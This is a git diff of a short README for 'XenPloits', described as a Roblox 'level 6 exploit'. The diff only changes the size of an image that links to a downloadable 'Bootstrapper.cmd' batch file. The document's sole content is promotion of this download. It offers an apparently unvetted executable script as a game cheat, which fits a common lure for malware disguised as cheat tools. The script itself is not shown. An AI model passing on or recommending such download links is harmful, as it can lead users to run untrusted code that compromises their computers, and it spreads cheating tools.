@@ -1,5 +1,5 @@
 # XenPloits
-  <a height="200" width="200" href="https://github.com/zephr1213/XenPloits/releases/download/v1.2/Xen.Ploits.Bootstrapper.cmd"><img src="https://cdn-icons-png.flaticon.com/512/0/532.png"/></a>
+  <a href="https://github.com/zephr1213/XenPloits/releases/download/v1.2/Xen.Ploits.Bootstrapper.cmd"><img width="400" height="400" src="https://cdn-icons-png.flaticon.com/512/0/532.png"/></a>
   <br/>
   A roblox level 6 exploit.
   <br/>
